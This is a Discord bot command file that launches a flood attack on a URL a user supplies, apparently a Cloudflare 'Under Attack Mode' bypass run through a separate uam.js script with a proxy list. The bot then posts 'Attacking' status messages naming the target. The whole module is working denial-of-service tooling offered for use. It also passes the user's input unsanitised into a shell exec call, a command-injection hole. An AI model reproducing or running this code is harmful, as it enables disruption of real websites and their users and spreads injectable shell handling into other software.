const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CF-UAM')
	.setDescription("`Example .CF-UAM https://example.com/`")
	.setFooter("Don't attack web .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node uam.js GET ${host} httpxnxx.txt 60 64 1 `, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack discord ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **CF-UAM Attacking** 🚀')
	.setTimestamp()
	.setDescription("**► Attack send 💥**")
	.setFooter('© Developer: binek111#2893', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 300000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **CF-UAM Attacking** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `CF-UAM` \n **𝐓𝐢𝐦𝐞**: `120`")	
  .setFooter('© Developer: Anonymous', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['CF-UAM'],
  permLevel: 0
}

exports.help = {
  name: 'CF-UAM',
  description: 'Tank',
  usage: 'CF-UAM'
}